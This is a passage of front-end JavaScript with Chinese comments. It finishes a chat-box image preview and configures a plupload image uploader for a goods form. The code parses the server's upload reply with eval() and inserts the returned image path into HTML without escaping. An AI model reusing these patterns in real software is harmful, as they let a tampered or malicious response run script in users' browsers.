                "<div class=\"chat-avatars\"><img src=\"css/985.jpg\" alt=\"头像\" /></div> </div> </div>");
            //聊天框默认最底部
            $(document).ready(function () {
                $("#chatBox-content-demo").scrollTop($("#chatBox-content-demo")[0].scrollHeight);
            });
            document.getElementById('timenow').innerHTML = timenow();
        };

        reader.readAsDataURL(pic.files[0]);

    }

	//	goods_img1
    var uploader_avatar4 = new plupload.Uploader({//创建实例的构造方法
                runtimes: 'gears,html5,html4,silverlight,flash', //上传插件初始化选用那种方式的优先级顺序
                browse_button: ['avatar_uplpad_btn4'], // 上传按钮
                url: "pluploadajax.php", //远程上传地址
                filters: {
                    max_file_size: '10mb', //最大上传文件大小（格式100b, 10kb, 10mb, 1gb）
                    mime_types: [//允许文件上传类型
                        {title: "files", extensions: "jpg,png,gif,jpeg"}
                    ]
                },
                multi_selection: false, //true:ctrl多文件上传, false 单文件上传
                init: {
                    FilesAdded: function(up, files) { //文件上传前
                        $("#avatar_pic4").hide();
                        $("#loading_bar4").show();
                        uploader_avatar4.start();
                    },
                    UploadProgress: function(up, file) { //上传中，显示进度条

                        var percent = file.percent;
                        $("#percent4").css({"width": percent + "%"});
                        $("#percentnum4").text(percent + "%");
                    },
                    FileUploaded: function(up, file, info) { //文件上传成功的时候触发
                        var data = eval("(" + info.response + ")");//解析返回的json数据
                        $("#avatar_pic4").html("<img  src='" + data.pic + "' width=100 height=100/>");
						$("#avatar_pic44").html("<input type='hidden'  name='goods_img1' value='" + data.pic + "'/>");
                        $("#loading_bar4").hide();
                        $("#avatar_pic4").show();
                    },
                    Error: function(up, err) { //上传出错的时候触发
                        alert(err.message);
                        $("#loading_bar4").hide();
                    }
                }
            });
			uploader_avatar4.init();
			
			
</script>


</body></html>